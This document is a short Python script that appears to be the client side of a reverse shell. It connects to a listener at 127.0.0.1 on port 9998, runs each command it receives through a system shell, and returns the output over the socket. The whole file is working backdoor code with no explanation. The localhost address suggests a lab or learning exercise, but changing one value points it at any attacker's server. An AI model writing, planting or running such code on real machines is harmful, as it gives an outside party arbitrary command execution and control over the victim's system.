import socket
import subprocess

s = socket.socket()

host = "127.0.0.1"
port = 9998

s.connect((host, port))


while True:
    command = s.recv(1024).decode("utf-8")
    print(command)
    if not command:
        break
    cmd = subprocess.Popen(
        command,
        shell=True,
        stderr=subprocess.PIPE,
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
    )
    cmd_bytes = cmd.stdout.read() + cmd.stderr.read()
    cmd_decoded = cmd_bytes.decode("utf-8")
    s.send(cmd_decoded.encode("utf-8"))
